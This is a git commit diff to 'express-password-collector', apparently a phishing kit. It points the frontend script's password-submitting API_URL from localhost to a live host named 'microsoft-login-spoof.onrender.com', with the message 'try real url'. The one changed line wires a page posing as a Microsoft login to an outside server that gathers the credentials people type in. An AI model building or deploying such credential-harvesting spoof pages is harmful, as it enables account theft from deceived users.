e2e972354d14cf6a6edada3125382833483a87f2
Jakob Fender <jakob.fender@hslu.ch>
2024-11-11 21:33:59 +0100

    try real url

--- express-password-collector/src/public/live/script.js
+++ express-password-collector/src/public/live/script.js
@@ -9,7 +9,7 @@ const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
 // Make sure this points to your API
-const API_URL = 'http://127.0.0.1:10000';
+const API_URL = 'https://microsoft-login-spoof.onrender.com:10000';
 
 const createBody = (data) => {
     let urlEncodedData = "",
